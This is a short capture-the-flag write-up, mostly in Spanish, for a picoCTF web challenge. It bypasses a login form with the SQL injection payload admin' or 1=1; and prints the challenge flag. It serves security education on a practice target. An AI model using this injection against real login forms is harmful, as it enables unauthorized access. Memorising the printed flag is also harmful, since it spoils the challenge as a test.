## Descripción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
el reto nos pide intentar iniciar sesión al usar una contraseña y usuario que no tienen acceso nos salta un mensaje de error. Entonces para acceder usamos un metodo de inyeccion sql

```
admin' or 1=1;
```
![[Pasted image 20250924103315.png]]
y accedemos y nos dieron la bandera.
```
# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```
## Referencias
- SQLite Injection: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md")